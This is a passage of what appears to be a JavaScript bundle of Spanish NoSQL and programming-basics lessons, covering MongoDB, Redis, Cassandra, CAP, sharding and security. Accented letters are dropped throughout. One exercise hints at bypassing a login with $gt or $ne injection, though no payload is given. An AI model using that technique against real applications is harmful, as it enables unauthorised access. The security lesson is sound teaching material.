Investiga el concepto de "Teorema CAP". Explica por qu una base de datos distribuida solo puede garantizar 2 de estas 3 cosas al mismo tiempo: Consistencia, Disponibilidad y Tolerancia a Particiones.
`,completed:!1},{id:"nosql-02-tipos",title:"Tipos de Bases NoSQL",level:"junior",content:`# Leccin 2: Tipos de Bases NoSQL

No todas las NoSQL son iguales. Se dividen segn cmo guardan los datos.

## 1. Documentales (MongoDB, CouchDB)
Guardan los datos en documentos (JSON o BSON). Es el tipo ms popular.
*   **Uso:** Perfiles de usuario, Catlogos de productos, CMS.
*   *Ventaja:* Los datos que se usan juntos, se guardan juntos.

## 2. Key-Value (Redis, DynamoDB bsico)
Es como un diccionario gigante de programacin (\`{clave: valor}\`).
*   **Uso:** Sesiones de usuario, Cach, Carrito de compras.
*   *Ventaja:* Velocidad de lectura/escritura en milisegundos.

## 3. Columnar (Cassandra, HBase)
Optimizadas para leer columnas especficas en billones de registros.
*   **Uso:** Analytics, logs histricos, series temporales.
*   *Ventaja:* Muy eficiente para Big Data.

## 4. Grafos (Neo4j, Amazon Neptune)
Se centran en las **relaciones** entre los datos.
*   **Uso:** Redes sociales (quin es amigo de quin), Sistemas de recomendacin, Deteccin de fraude.
*   *Ventaja:* Consultar conexiones complejas es instantneo.

---

### Misin Junior:
Imagina que ests construyendo Twitter. Qu tipo de base de datos usaras para los Tweets y cul para el sistema de "Seguir a otros usuarios"? Justifica tu respuesta.
`,completed:!1},{id:"nosql-03-mongodb-basico",title:"MongoDB Bsico (CRUD)",level:"junior",content:`# Leccin 3: MongoDB Bsico (El Rey de los Documentos)

Es la base NoSQL ms usada en el mundo. Vamos a ensuciarnos las manos.

## 1. Conceptos Clave
*   **Database:** El contenedor (igual que en SQL).
*   **Collection:** Equivalente a una tabla.
*   **Document:** Equivalente a una fila (un objeto JSON).
*   **BSON:** "Binary JSON". Es el formato interno de Mongo, ms rpido y soporta ms tipos de datos que el JSON comn.

## 2. CRUD: Los Comandos Esenciales

### Insert (Crear)
\`\`\`javascript
db.users.insertOne({
  name: "Octavio",
  age: 28,
  skills: ["JavaScript", "Cloud"]
})
\`\`\`

### Find (Leer)
\`\`\`javascript
// Buscar todos
db.users.find()

// Buscar con filtro
db.users.find({ age: { $gt: 18 } }) // Usuarios mayores de 18
\`\`\`

### Update (Actualizar)
\`\`\`javascript
db.users.updateOne(
  { name: "Octavio" },
  { $set: { age: 29 } }
)
\`\`\`

### Delete (Borrar)
\`\`\`javascript
db.users.deleteOne({ name: "Octavio" })
\`\`\`

---

### Misin Junior:
Instala **MongoDB Compass** (el cliente visual) o usa **MongoDB Atlas** (en la nube gratis).
1. Crea una coleccin llamada \`books\`.
2. Inserta 3 libros con campos distintos (algunos con autor, otros con tags, otros con reviews). Mira cmo Mongo no se queja!
3. Busca todos los libros cuyo "precio" sea menor a 50.
`,completed:!1},{id:"nosql-04-modelado",title:"Modelado NoSQL (Embedding vs Referencing)",level:"junior",content:`# Leccin 4: Modelado Bsico (Embedding vs Referencing)

En SQL normalizas. En NoSQL, modelas segn cmo vas a consultar la aplicacin.

## 1. Embedding (Embeber / Anidamiento)
Guardas los datos relacionados dentro del mismo documento.
\`\`\`json
{
  "order_id": 1,
  "user": "Octavio",
  "items": [
    { "product": "Monitor", "price": 200 },
    { "product": "Teclado", "price": 50 }
  ]
}
\`\`\`
*   **Cundo usar:** Relaciones 1:1 o 1:pocos. Los datos son pequeos y cambian poco.

## 2. Referencing (Referencia / El "JOIN" manual)
Guardas el ID del otro documento.
\`\`\`json
// Coleccin Orders
{
  "order_id": 1,
  "user_id": "ABC-123"
}
\`\`\`
*   **Cundo usar:** Relaciones 1:Muchos (miles) o Muchos:Muchos. Los datos crecen mucho o se usan en muchas partes.

## 3. Buenas Prcticas
*   **Regla de Oro:** "Los datos que se acceden juntos, deben estar juntos".
*   Evita anidar ms de 2 o 3 niveles.
*   No dejes que los documentos superen los 16MB (lmite de Mongo).

---

### Misin Junior:
Si ests modelando un Blog:
1. Los "comentarios" deberan estar dentro del documento del "Post" (Embedding) o en otra coleccin (Referencing)?
2. Qu pasa si el post tiene 10,000 comentarios? Investiga por qu el Embedding podra fallar en este caso.
`,completed:!1},{id:"nosql-05-proyecto-final",title:"Proyecto Final Junior NoSQL",level:"junior",content:`# Proyecto Final Nivel Junior: "Mi Primer Catlogo NoSQL"

Vamos a conectar Node.js con MongoDB para crear una API real.

## Objetivo
Crear un sistema de gestin de "Videojuegos" usando MongoDB como base de datos y Mongoose (el ODM de Node.js).

## Tareas Tcnico-Prcticas
1.  **Atlas:** Crea un cluster gratuito en MongoDB Atlas.
2.  **Node.js:** Inicializa un proyecto con \`npm init -y\` e instala \`mongoose\` y \`express\`.
3.  **Schema:** Define un esquema para \`Game\`:
    *   \`title\`: String (requerido).
    *   \`platform\`: String.
    *   \`genres\`: Array de Strings.
    *   \`rating\`: Number.
4.  **Endpoints:**
    *   \`POST /games\`: Para insertar un juego.
    *   \`GET /games\`: Para listar todos.
    *   \`GET /games?genre=RPG\`: Para filtrar por gnero.
    *   \`DELETE /games/:id\`: Para borrar.

## Entregable (Checklist)
*   [ ] El cdigo se conecta correctamente a la URI de Atlas.
*   [ ] Puedo insertar un juego sin definir todos los campos (flexibilidad).
*   [ ] He probado los endpoints con Postman o Thunder Client.
*   [ ] Explico en el README por qu eleg MongoDB para este catlogo en lugar de SQL.

Felicidades! Acabas de construir tu primer servicio con persistencia no relacional.
`,completed:!1},{id:"nosql-06-mongodb-intermedio",title:"MongoDB Intermedio (Agregacin)",level:"semi-senior",content:`# Leccin 6: MongoDB Intermedio (ndices y Agregacin)

Cuando tu base de datos crece de 1,000 a 1,000,000 de documentos, el rendimiento se vuelve crtico.

## 1. ndices: El mapa del tesoro
Sin ndices, MongoDB hace un **Collection Scan** (revisa cada documento). Con ndices, usa una estructura B-tree para saltar directamente al dato.
*   **Crear ndice:** \`db.users.createIndex({ email: 1 })\`
*   **ndices Compuestos:** \`db.orders.createIndex({ user_id: 1, date: -1 })\`
*   **Explain Plan:** Usa \`.explain("executionStats")\` para ver si tu consulta est usando el ndice o escaneando toda la coleccin.

## 2. Aggregation Pipeline
Es el "procesador de alimentos" de MongoDB. Permite transformar y calcular datos en etapas.
*   **$match:** Filtra documentos (como \`WHERE\`).
*   **$group:** Agrupa datos y calcula totales (como \`GROUP BY\`).
*   **$project:** Selecciona o renombra campos.
*   **$lookup:** El "Join" de MongoDB para unir colecciones.

### Ejemplo de Aggregation:
\`\`\`javascript
db.orders.aggregate([
  { $match: { status: "completed" } },
  { $group: { _id: "$customer_id", total: { $sum: "$amount" } } },
  { $sort: { total: -1 } }
])
\`\`\`

## 3. Performance Tuning
*   **Covered Queries:** Cuando el ndice contiene todos los campos que pides, Mongo ni siquiera lee el documento del disco.
*   **Proyeccin:** Pide solo los campos que necesitas \`find({}, { name: 1 })\`.

---

### Misin Semi-Senior:
Crea un Pipeline de agregacin que:
1. Una la coleccin \`users\` con \`orders\` usando \`$lookup\`.
2. Filtre solo los usuarios activos.
3. Calcule el promedio de gasto por usuario.
4. Exporta el resultado a una nueva coleccin usando \`$out\`.
`,completed:!1},{id:"nosql-07-redis",title:"Redis Cache",level:"semi-senior",content:`# Leccin 7: Redis (Cach y Alta Velocidad)

Redis no reemplaza a tu base de datos, la acelera.

## 1. Qu es Redis?
Es una base de datos en memoria (RAM). Es extremadamente rpida porque no escribe en disco para responder una consulta.

## 2. Casos de Uso Reales
*   **Cach de Sesiones:** Guardar el estado del login del usuario.
*   **Cach de Base de Datos:** Guardar el resultado de una query lenta de SQL/Mongo durante 5 minutos.
*   **Contadores en tiempo real:** "Likes" en un streaming masivo.
*   **Pub/Sub:** Sistema de mensajera instantnea.

## 3. Comandos y TTL (Time To Live)
El TTL es vital para que la memoria no explote.
*   \`SET user:123 "Octavio" EX 3600\` -> Guarda el valor y lo borra automticamente en 1 hora.
*   \`GET user:123\` -> Recupera el valor.
*   \`INCR view_count\` -> Incrementa un nmero de forma atmica.

## 4. Estrategias de Cach
*   **Cache-Aside:** La App busca en Redis. Si no est (Cache Miss), busca en DB, guarda en Redis y responde.
*   **Write-Through:** La App escribe en Redis y Redis escribe en DB.

---

### Misin Semi-Senior:
Implementa un middleware en Express que:
1. Revise si una ruta (ej: \`/products\`) est en Redis.
2. Si est, devuelva el JSON inmediatamente.
3. Si no, consulte a Mongo, guarde el resultado en Redis por 60 segundos y responda.
Mide la diferencia de tiempo entre el primer y el segundo request.
`,completed:!1},{id:"nosql-08-cassandra",title:"Cassandra Columnar",level:"semi-senior",content:`# Leccin 8: Cassandra (Escalabilidad Masiva)

Cuando MongoDB no es suficiente, entra Cassandra.

## 1. El modelo Columnar (Wide Column)
Cassandra no guarda documentos JSON, guarda filas con columnas dinmicas agrupadas por una **Partition Key**. Est diseada para escrituras masivas (millones por segundo).

## 2. Arquitectura Peer-to-Peer
A diferencia de Mongo (Master-Slave), en Cassandra todos los nodos son iguales. No hay un punto nico de falla.
*   **Replication Factor:** Cuntas copias de cada dato hay en el cluster.
*   **Consistency Level:** Cuntos nodos deben confirmar que el dato se guard para dar la operacin por exitosa? (ONE, QUORUM, ALL).

## 3. Particionamiento: El secreto de la escala
Los datos se distribuyen segn el hash de la Partition Key.
*   **Consulta Eficiente:** Solo puedes consultar eficientemente si incluyes la Partition Key. Cassandra sabe exactamente en qu servidor est el dato.
*   **Antipatrn:** Hacer un "SELECT *" sin filtro de particin. Esto obliga a preguntar a todos los servidores del mundo (lento y rompe el cluster).

---

### Misin Semi-Senior:
Investiga el concepto de "Query-First Design". En Cassandra, primero escribes la consulta que quieres hacer y LUEGO diseas la tabla. Es lo opuesto a SQL. Por qu ocurre esto?
`,completed:!1},{id:"nosql-09-modelado-avanzado",title:"Modelado Avanzado NoSQL",level:"semi-senior",content:`# Leccin 9: Modelado Avanzado y Denormalizacin

En Semi-Senior, dejas de tener miedo a la duplicidad de datos.

## 1. Denormalizacin Estratgica
En SQL duplicar datos es pecado. En NoSQL, es una estrategia para ganar velocidad.
*   **Ejemplo:** En lugar de unir \`User\` y \`Post\` cada vez, guarda el \`username\` y la \`profile_pic\` dentro de cada \`Post\`.
*   **Trade-off:** La lectura es instantnea (1 query), pero si el usuario cambia su foto, debes actualizar miles de posts (escritura costosa).

## 2. Modelado basado en Accesos
Dibuja las pantallas de tu UI.
*   Qu datos muestra la Home? Crea una coleccin que tenga exactamente eso.
*   Qu datos muestra el Perfil? Crea otra.
*   **Storage es barato, el tiempo de CPU es caro.**

## 3. Atomicidad y Transacciones
MongoDB soporta transacciones multi-documento desde la v4.0, pero son pesadas.
*   Intenta disear tus documentos para que una operacin de negocio quepa en un solo documento (atomicidad garantizada).

---

### Misin Semi-Senior:
Dada una red social tipo Instagram:
Disea el modelo de datos para "Likes".
1. Opcin A: Array de IDs de usuarios dentro del Post.
2. Opcin B: Coleccin separada \`Likes\`.
Explica cul escala mejor si un Post de un famoso tiene 5 millones de likes.
`,completed:!1},{id:"nosql-10-integracion-profesional",title:"Integracin Profesional NoSQL",level:"semi-senior",content:`# Leccin 10: Integracin Profesional (Mongoose Avanzado)

Lleva tu backend al siguiente nivel con patrones de produccin.

## 1. Validaciones y Middlewares
Mongoose permite ejecutar lgica antes/despus de guardar.
\`\`\`javascript
userSchema.pre('save', async function(next) {
  if (this.isModified('password')) {
    this.password = await bcrypt.hash(this.password, 10);
  }
  next();
});
\`\`\`

## 2. Mtodos de Instancia y Estticos
No pongas toda la lgica en el controlador. Ponla en el modelo.
*   **Static:** \`User.findByEmail(email)\`
*   **Method:** \`user.comparePassword(candidate)\`

## 3. Populate vs Virtuals
*   **Populate:** Trae datos de otra coleccin (parecido a JOIN).
*   **Virtuals:** Campos que no existen en la DB pero se calculan al vuelo (ej: \`fullName\` uniendo \`firstName\` y \`lastName\`).

## 4. Manejo de Errores
Detecta duplicados de ndices nicos y errores de validacin para responder cdigos HTTP 400 consistentes.

---

### Misin Semi-Senior:
Implementa un esquema de "Carrito de Compras" que:
1. Use un Virtual para calcular el \`totalPrice\` sumando los items.
2. Use un \`pre('save')\` para verificar que el stock de los productos sea suficiente antes de confirmar la orden.
`,completed:!1},{id:"nosql-11-proyecto-final-semisenior",title:"Proyecto Final Semi-Senior NoSQL",level:"semi-senior",content:`# Proyecto Final Semi-Senior: "Sistema de Analytics en Tiempo Real"

Vamos a construir una arquitectura hbrida NoSQL diseada para el rendimiento.

## El Escenario
Netflix necesita rastrear qu pelculas ven los usuarios. Cada vez que alguien hace click en "Play", se debe registrar. Si la misma pelcula se ve mucho, debe aparecer en "Tendencias" rpidamente.

## Requerimientos Tcnicos
1.  **MongoDB (Persistencia):** Guarda el historial completo de visualizaciones.
2.  **Indices:** Crea un ndice compuesto por \`user_id\` y \`timestamp\`.
3.  **Aggregation:** Crea un endpoint \`GET /trending\` que use el pipeline de agregacin para contar visualizaciones en las ltimas 24 horas.
4.  **Redis (Cache):**
    *   Cachea el resultado de \`/trending\` por 5 minutos para no matar a MongoDB con agregaciones constantes.
    *   Usa Redis para contar "visualizaciones activas" (quin est viendo algo justo ahora) con un TTL de 10 segundos.

## Evaluacin Tcnica (Preguntas de Defensa)
*   Por qu usamos Redis para las visualizaciones activas en lugar de escribir cada 10 segundos en Mongo?
*   Qu pasara con el rendimiento si no tuviramos el ndice compuesto en Mongo?
*   Explica cmo manejaras una situacin donde Redis se cae. La app debera seguir funcionando?

## Entregable
*   Repositorio con la API.
*   Archivo de configuracin de Docker Compose para levantar Mongo y Redis.
*   Pruebas de carga (usando \`autocannon\` o similar) mostrando la diferencia de velocidad con y sin cache.

Has escalado al nivel Semi-Senior! Tu mente ahora piensa en milisegundos y concurrencia.
`,completed:!1},{id:"nosql-12-arquitectura-distribuida",title:"Arquitectura Distribuida y Sharding",level:"senior",content:`# Leccin 12: Arquitectura Distribuida y Sharding

A nivel Senior, el desafo no es cmo guardar datos, sino cmo distribuirlos a travs del planeta.

## 1. Replicacin vs Sharding
*   **Replicacin (Alta Disponibilidad):** Copias los mismos datos en varios servidores. Si uno muere, los otros siguen vivos. (Replica Sets en Mongo).
*   **Sharding (Escalabilidad):** Divides los datos. El Servidor A tiene los usuarios A-M, el Servidor B tiene N-Z. Esto permite manejar petabytes de datos que no caben en un solo disco.

## 2. Consistencia Eventual
En sistemas distribuidos masivos, a veces sacrificamos que todos vean el mismo dato *exactamente al mismo tiempo* por velocidad.
*   **Consistencia Fuerte:** Esperas a que todos los nodos confirmen. (Lento).
*   **Consistencia Eventual:** Respondes rpido y dejas que los nodos se sincronicen en milisegundos. (Rpido, ideal para redes sociales).

## 3. Shard Key Selection
Es la decisin ms importante de un Arquitecto NoSQL.
*   Una mala Shard Key crea "Hot Spots" (un servidor trabajando al 100% mientras los dems estn libres).
*   **Buena Key:** Alta cardinalidad y distribucin uniforme.

---

### Misin Senior:
Investiga el "Hashed Sharding" de MongoDB. Cmo ayuda a evitar Hot Spots cuando insertas datos con IDs secuenciales (como Timestamps)?
`,completed:!1},{id:"nosql-13-teorema-cap",title:"Teorema CAP",level:"senior",content:`# Leccin 13: El Teorema CAP

La ley fundamental de los sistemas distribuidos.

## 1. Los tres pilares
*   **Consistency (Consistencia):** Todos los nodos ven el mismo dato al mismo tiempo.
*   **Availability (Disponibilidad):** Cada peticin recibe una respuesta (xito o error).
*   **Partition Tolerance (Tolerancia a Particiones):** El sistema sigue funcionando aunque se pierda la conexin entre nodos.

## 2. La dura realidad
En un sistema distribuido **P** siempre ocurre (internet falla). Por lo tanto, debes elegir entre:
*   **CP (Consistencia + Particin):** Si hay falla, el sistema se bloquea para no dar datos viejos. (Ej: MongoDB por defecto).
*   **AP (Disponibilidad + Particin):** Si hay falla, el sistema responde lo que tiene aunque est desactualizado. (Ej: Cassandra, DynamoDB).

## 3. PACELC
Una extensin del CAP: Cuando NO hay particin (falla), eliges Latencia o Consistencia?

---

### Misin Senior:
Analiza por qu un sistema bancario NUNCA puede ser AP. Qu pasara con un retiro de dinero si el sistema prefiere responder rpido antes que estar sincronizado?
`,completed:!1},{id:"nosql-14-event-driven",title:"Event-Driven y CQRS NoSQL",level:"senior",content:`# Leccin 14: Event-Driven y NoSQL (CQRS & Event Sourcing)

Patrones avanzados para sistemas desacoplados.

## 1. CQRS con NoSQL
Separamos las escrituras (Command) de las lecturas (Query).
*   **Escritura:** Un servicio escribe en una base de datos optimizada para transacciones.
*   **Lectura:** Los datos se proyectan a una NoSQL (Mongo, Redis) optimizada para esa vista especfica.
*   Se comunican mediante un Bus de Eventos (Kafka, RabbitMQ).

## 2. Event Sourcing
No guardas el "estado actual" del usuario, sino el historial de sus acciones.
*   \`UserCreated\`, \`EmailUpdated\`, \`PasswordChanged\`.
*   El estado actual es la suma de todos esos eventos.
*   **NoSQL:** Es ideal para guardar estos "streams" de eventos por su alta velocidad de insercin.

## 3. Change Streams (MongoDB)
Permite a tu aplicacin escuchar cambios en tiempo real en la base de datos y disparar acciones (ej: Enviar un mail cuando se inserta un documento).

---

### Misin Senior:
Dibuja el flujo de datos de un sistema que usa MongoDB para las Queries y PostgreSQL para los Commands. Cmo manejas el retraso de sincronizacin (Replication Lag)?
`,completed:!1},{id:"nosql-15-seguridad-avanzada",title:"Seguridad Senior NoSQL",level:"senior",content:`# Leccin 15: Seguridad Senior en NoSQL

No dejes tus datos abiertos al mundo.

## 1. RBAC (Role-Based Access Control)
No uses la cuenta \`admin\`. Crea roles especficos:
*   \`readWriteAnyDatabase\` para la app.
*   \`backup\` para el sistema de mantenimiento.
*   \`dbAdmin\` para el DBA.

## 2. Encryption at Rest & In Transit
*   **TLS/SSL:** Obligatorio para cualquier conexin.
*   **Encryption at Rest:** Cifrar los archivos en el disco para que, si alguien roba el servidor fsico, no pueda leer los datos.

## 3. Client-Side Field Level Encryption
La DB ni siquiera ve el dato plano. La App lo cifra antes de mandarlo. Solo la App tiene la llave. Ideal para datos ultra-sensibles (tarjetas de crdito, salud).

---

### Misin Senior:
Investiga el ataque de "NoSQL Injection". Cmo se diferencia de SQL Injection? (Pista: Busca cmo usar operadores \`$gt\` o \`$ne\` en el body de un request para saltarse un login).
`,completed:!1},{id:"nosql-16-proyecto-final-senior",title:"Proyecto Final Senior NoSQL",level:"senior",content:`# Proyecto Final Nivel Senior: "Arquitectura de Escala Global"

Este es tu examen para el rol de Principal Engineer o Architect.

## El Escenario
Amazon necesita un nuevo servicio de "Historial de visualizaciones de productos" para el Prime Day. Se esperan 200,000 escrituras por segundo y billones de documentos al mes.

## El Desafo Arquitectnico
Debes disear e implementar una arquitectura que soporte esto sin caerse y con latencia < 20ms.

## Requerimientos
1.  **Diseo de Cluster:** Define la estrategia de Sharding. Qu Shard Key eliges? Justifcala matemticamente.
2.  **Multiregin:** Explica cmo replicaras los datos entre USA, Europa y Asia evitando conflictos de escritura.
3.  **Integracin con Microservicios:** Disea el flujo usando un Message Broker para desacoplar la escritura de la visualizacin.
4.  **Costo:** Estima el costo de este cluster en la nube y propone una poltica de borrado (TTL) o archivado para ahorrar 40% anualmente.

## Entregable (Technical Design Document)
Crea un archivo \`ARCHITECTURE_PROPOSAL.md\` que contenga:
*   Diagrama de nodos (Config Servers, Query Routers/Mongos, Shards).
*   Justificacin de eleccin CAP (CP vs AP).
*   Plan de recuperacin ante desastres (Qu pasa si una regin de AWS desaparece?).
*   Cdigo de ejemplo del Schema de Mongoose optimizado.

Felicidades! Has completado el camino de las Bases de Datos NoSQL. Ahora dominas la persistencia del futuro.
`,completed:!1}]},pD={id:"prog-bases",title:"Bases de la Programacin",description:"Aprende los fundamentos de la lgica y el pensamiento computacional desde cero.",completed:!1,lessons:[{id:"prog-bases-01-que-es-programar",title:"Qu es programar?",level:"junior",content:`# Leccin 1: Qu es programar?

Bienvenido al inicio de tu carrera en tecnologa! Muchas personas creen que programar es algo mgico o reservado para genios matemticos, pero la realidad es mucho ms terrenal.

## 1. La analoga del Robot Cocinero
Imagina que tienes un robot en tu cocina. Este robot es increblemente rpido y nunca se cansa, pero tiene un problema: **es extremadamente tonto**. No tiene sentido comn. Si le dices "hazme un caf", el robot no sabr qu hacer porque no sabe qu es el caf, dnde est el agua o cmo encender la cafetera.

**Programar es escribir el manual de instrucciones detallado** para que ese robot (la computadora) pueda realizar una tarea.

## 2. El lenguaje de las mquinas
Las computadoras no entienden el espaol o el ingls de forma natural. Ellas hablan en impulsos elctricos (encendido y apagado, 0 y 1). Como sera muy difcil para nosotros escribir millones de ceros y unos, inventamos los **Lenguajes de Programacin**.

Estos lenguajes son como un puente:
* T escribes algo parecido al lenguaje humano (pero con reglas estrictas).
* Un traductor (llamado compilador o intrprete) lo convierte a ceros y unos para la mquina.

## 3. Entonces, qu hace un programador?
Un programador es, ante todo, un **solucionador de problemas**. Su trabajo no es "escribir cdigo" durante 8 horas, sino:
1. Entender un problema (ejemplo: "la gente necesita pedir comida de forma fcil").
2. Dividir ese problema en pasos pequeos.
3. Escribir esos pasos en un lenguaje que la computadora entienda.

## 4. El primer concepto clave: El Determinismo
En el mundo de la programacin, si le das las mismas instrucciones a una computadora diez mil veces, obtendrs el mismo resultado diez mil veces. La computadora no tiene "malos das" ni "se olvida" de los pasos. Si algo sale mal, **el error est en la instruccin, no en la mquina**.

---

### Ejercicio Mental 1:
Piensa en una tarea cotidiana, como lavarse los dientes. Cmo le explicaras a alguien que NO SABE NADA qu debe hacer paso a paso? Intenta no saltarte ningn detalle (abrir la canilla, poner pasta, etc.). Escribe esos pasos en un papel o mencinalos mentalmente. Ese es el primer paso para pensar como programador.
`,completed:!1},{id:"prog-bases-02-que-es-algoritmo",title:"Qu es un algoritmo?",level:"junior",content:`# Leccin 2: Qu es un algoritmo?

Si "programar" es dar instrucciones, un **algoritmo** es el plan detallado que contiene esas instrucciones. No te asustes por la palabra; usas algoritmos todo el tiempo sin saberlo.

## 1. Definicin simple
Un algoritmo es una **secuencia lgica de pasos** para resolver un problema o cumplir un objetivo. 

Para que un conjunto de pasos sea un algoritmo de verdad, debe cumplir tres reglas:
1. **Tiene un inicio y un fin:** No puede durar para siempre.
2. **Es preciso:** Cada paso debe estar claro. No puede haber "un poquito de sal" o "espera un rato"; debe ser "5 gramos de sal" o "espera 10 segundos".
3. **Es ordenado:** El orden de los factores s altera el producto. No puedes ponerte los zapatos y despus las medias.

## 2. Algoritmos en la vida real
*   **Una receta de cocina:** Es el ejemplo clsico. Pasos ordenados para llegar a un plato final.
*   **Un manual de muebles:** El "paso 1", "paso 2" para armar una silla.
*   **Tu rutina de maana:** Despertar -> Levantar -> Baarse -> Desayunar.

## 3. Por qu es importante en programacin?
Antes de tocar el teclado, un programador debe tener el algoritmo en su cabeza o en un papel. Si tu lgica (tu plan) est mal, el programa va a fallar aunque lo escribas "bonito". 

**Dato importante:** Un mismo problema puede tener muchos algoritmos diferentes. Algunos son ms rpidos, otros ocupan menos espacio, pero si ambos llegan al resultado, ambos son vlidos.

## 4. El concepto de "Unidad Mnima"
En programacin, intentamos que cada paso del algoritmo sea lo ms simple posible. En lugar de decir "Limpia la casa", un algoritmo dira:
1. Agarra la escoba.
2. Barre el saln.
3. Guarda la basura.
4. Trapea el piso.

---

### Ejercicio Mental 2:
Ayer te encontraste con un amigo que no sabe usar un cajero automtico. Disea un algoritmo sencillo (5 a 7 pasos) para retirar dinero. Recuerda que debes ser preciso: Cundo pone la tarjeta? Cundo pone el PIN? Cundo retira el efectivo?
`,completed:!1},{id:"prog-bases-03-pensamiento-logico",title:"Pensamiento Lgico",level:"junior",content:`# Leccin 3: Pensamiento Lgico

Programar no se trata de memorizar comandos, sino de **aprender a pensar**. La computadora no tiene intuicin, por lo que nosotros debemos ser sus "ojos lgicos".

## 1. La Decomposicin: "Divide y Vencers"
Cuando nos enfrentamos a un problema grande (ej: "Crear un videojuego"), nos sentimos abrumados. El pensamiento lgico nos ensea a romper ese problema en piezas tan pequeas que parezcan ridculas.

Por ejemplo, para que un personaje salte en un juego:
1. Detectar si el jugador presion la flecha arriba.
2. Si la presion, cambiar la posicin del personaje hacia arriba.
3. Esperar un milisegundo.
4. Cambiar la posicin hacia abajo hasta que toque el suelo.

## 2. Reconocimiento de Patrones
Te diste cuenta de que muchas cosas en la vida se repiten?
*   Cada vez que entras a una habitacin oscura, buscas el interruptor.
*   Cada vez que termina un captulo de una serie, empieza la intro del siguiente.

En programacin, buscamos estos patrones para no escribir la misma instruccin mil veces. Si algo se repite, podemos crear una "regla" general.

## 3. Abstraccin: Ignorar lo innecesario
Abstraer es enfocarse en lo que importa para el problema y olvidar los detalles secundarios.
Si quiero programar una aplicacin de mapas, me importa la latitud, la longitud y el nombre de la calle. NO me importa de qu color son las casas de esa calle o si el pavimento es de asfalto o piedra. 

**La abstraccin nos ayuda a simplificar la realidad para que quepa en una computadora.**

## 4. El "Si... entonces..." (Lgica Proposicional)
La lgica de programacin se basa mucho en condiciones.
*   **Si** tengo hambre **entonces** como.
*   **Si** tengo dinero **y** el producto est disponible **entonces** compro.
*   **Si** llueve **entonces** no salgo.

Aprender a conectar estas ideas es lo que realmente te convierte en programador.

---

### Ejercicio Mental 3:
Piensa en el proceso de "hacer una compra en el supermercado".
1. Aplica la **decomposicin**: Nombra 5 tareas pequeas dentro de esa gran tarea.
2. Aplica la **abstraccin**: Si estuvieras haciendo una app para el sper, qu datos del producto guardaras? (El peso? El color de la etiqueta? El precio? El nombre del repositor?). Elige solo los 3 ms importantes.
`,completed:!1},{id:"prog-bases-04-entrada-proceso-salida",title:"Entrada, Proceso y Salida",level:"junior",content:`# Leccin 4: Entrada, Proceso y Salida

Casi todo lo que pasa dentro de una computadora (y en la vida) sigue un esquema de tres pasos fundamentales. Si entiendes esto, entenders cmo funciona cualquier programa del mundo.

## 1. Entrada (Input)
Es todo lo que el programa recibe del exterior. Son los "ingredientes" que necesitamos para trabajar.
*   **Ejemplos:** Lo que escribes con el teclado, un clic del mouse, tu cara frente a la cmara, un archivo de texto, o incluso la ubicacin de tu GPS.

## 2. Proceso (Processing)
Es la "magia" que ocurre adentro. El programa agarra la entrada y hace algo con ella siguiendo un algoritmo. Es la transformacin de los datos.
*   **Ejemplos:** Sumar dos nmeros, buscar una palabra en un prrafo, filtrar una foto con un efecto de Instagram, o verificar si una contrasea es correcta.

## 3. Salida (Output)
Es el resultado final que el programa le devuelve al mundo. Es el "plato terminado".
*   **Ejemplos:** Un mensaje en la pantalla, un sonido, un documento impreso, o el mensaje que le llega a tu amigo por WhatsApp.

---

## Un ejemplo prctico: Una Calculadora Humana
Imagina que te pido que sumes dos nmeros.
1. **Entrada:** Yo te digo los nmeros "5" y "8".
2. **Proceso:** Tu cerebro realiza la operacin matemtica (5 + 8).
3. **Salida:** T me dices el resultado: "13".

## Por qu importa esto?
Como programador, siempre debes preguntarte:
*   Qu datos necesito para que esto funcione? (**Entrada**)
*   Qu tengo que hacer con esos datos? (**Proceso**)
*   Qu espera ver el usuario al final? (**Salida**)

Si uno de estos falla, el programa no sirve. Si le das a la calculadora "Letras" en lugar de "Nmeros" (Entrada incorrecta), el proceso fallar.

---

### Ejercicio Mental 4:
Identifica la Entrada, el Proceso y la Salida de los siguientes sistemas:
1.  **Un Horno de Microondas.**
2.  **El inicio de sesin en Facebook.**
3.  **Un termmetro digital.**

*Respuesta sugerida para el Microondas:*
*   Entrada: Comida fra + Tiempo de coccin.
*   Proceso: Emitir ondas de calor durante el tiempo marcado.
*   Salida: Comida caliente + Sonido de "pip".
`,completed:!1},{id:"prog-bases-05-variables-concepto",title:"Variables (El concepto)",level:"junior",content:`# Leccin 5: Variables (El concepto)

Imagina que ests haciendo una mudanza. Tienes muchas cajas. Para no volverte loco, escribes en el exterior de cada caja qu hay adentro: "Libros", "Ropa", "Cocina". 

**En programacin, una variable es esa caja etiquetada.**

## 1. Qu es una variable?
Es un espacio en la memoria de la computadora donde guardamos un dato para usarlo ms tarde. Tiene dos partes esenciales:
1.  **El Nombre (La etiqueta):** Cmo llamamos a ese espacio para encontrarlo despus.
2.  **El Valor (El contenido):** Lo que est guardado adentro en este momento.

## 2. Por qu se llaman "Variables"?
Se llaman as porque su contenido puede **variar** (cambiar) a lo largo del tiempo.
*   Imagina un juego donde tienes una variable llamada \`puntos\`. Al empezar vale 0. Si matas a un monstruo, la caja se abre, sacamos el 0 y ponemos un 10. El nombre sigue siendo \`puntos\`, pero el valor cambi.

## 3. Reglas de oro para los nombres
Para que la computadora (y otros humanos) te entiendan, los nombres de las variables deben ser claros:
*   **Malos nombres:** \`x\`, \`cosa\`, \`variable1\`, \`asdasd\`.
*   **Buenos nombres:** \`nombre_usuario\`, \`precio_total\`, \`edad\`, \`esta_logueado\`.

**Regla pro:** No uses espacios en los nombres. Usa guiones bajos (\`precio_final\`) o maysculas intermedias (\`precioFinal\`).

## 4. Un ejemplo en Pseudocdigo
El **pseudocdigo** es escribir lgica de programacin pero en nuestro idioma, sin reglas tcnicas de ningn lenguaje especfico. Es como un borrador.

Mira cmo definiramos variables:
\`\`\`text
Variable nombre = "Juan"
Variable edad = 25
Variable puntos = 0

// Luego de jugar...
puntos = puntos + 10  // Ahora la caja 'puntos' tiene un 10
\`\`\`

---

### Ejercicio Mental 5:
Si estuvieras creando una aplicacin de contactos (como la de tu celular), qu nombres de variables usaras para guardar la informacin de una persona? Nombra al menos 4 variables. Recuerda usar nombres claros.
`,completed:!1},{id:"prog-bases-06-tipos-datos-concepto",title:"Tipos de Datos (Conceptual)",level:"junior",content:`# Leccin 6: Tipos de Datos (Conceptual)

En la leccin anterior vimos que las variables son como cajas. Pero, al igual que en la vida real, no pones una pizza en una caja de zapatos, ni guardas lquido en una caja de cartn sin proteccin. 

**En programacin, el tipo de dato define qu tipo de informacin hay dentro de la caja.**

## 1. Los 3 tipos fundamentales
